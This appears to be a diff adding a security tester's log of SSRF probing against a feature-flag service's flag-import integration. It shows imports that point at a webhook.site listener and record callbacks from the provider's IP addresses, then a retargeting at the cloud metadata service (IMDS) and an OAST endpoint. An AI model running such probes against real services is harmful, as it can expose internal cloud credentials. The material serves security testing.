@@ -1,0 +1,28 @@
+### 1. set webhook.site default response = valid unleash projects JSON
+ webhook.site PATCH: {"success":false,"error":{"message":"Token \"token\" not found","id":""}}
+
+### 2. retrigger import #1 and watch parse-driven fetches
+trigger -> 201
+listener total: 26
+  2026-10-22 22:23:54 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3/unleash-api/api/client ip=52.21.152.96
+  2026-10-22 22:21:53 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3/unleash-api/api/client ip=52.21.152.96
+  2026-10-22 22:21:10 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3/unleash-api/api/client ip=52.21.152.96
+  2026-10-22 22:21:08 POST https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook ip=34.236.6.43
+  2026-10-22 22:21:08 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=34.236.6.43
+  2026-10-22 22:15:30 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=54.144.218.89
+  2026-10-22 22:15:30 POST https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook ip=54.221.221.197
+  2026-10-22 22:15:26 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=34.236.6.43
+
+### 3. import #2 -> IMDS (correct schema: config only)
+create -> 201 {"_links": {"self": {"href": "/api/v2/integration-capabilities/flag-import/default/unleash/ada3edd9-2c79-4937-8ecf-02f89691a4d9", "type": "application/json"}, "parent": {"href": "/api/v2/integration-capabilities/flag-import", "type": "application/jso
+trigger2 -> 201
+listener total after IMDS trigger: 28
+
+### 4. import #3 -> OAST (Burp visibility of import egress)
+trigger3 -> 201 (id3=45734812-302e-4792-b92a-fb6aa81fb982)
+
+### 5. audit log entries from imports (error leakage?)
+auditlog query=import -> 200, 0 items
+
+### 6. aiconfig-test-run manifest
+[200] {"_links": {"parent": {"href": "/api/v2/integration-manifests", "type": "application/json"}, "self": {"href": "/api/v2/integration-manifests/aiconfig-test-run", "type": "application/json"}, "subscriptions": {"href": "/api/v2/integrations/aiconfig-test-run", "type": "application/json"}}, "key": "aiconfig-test-run", "additionalFields": {"status": "default", "upsellKind": "none", "shouldUpsell": fals
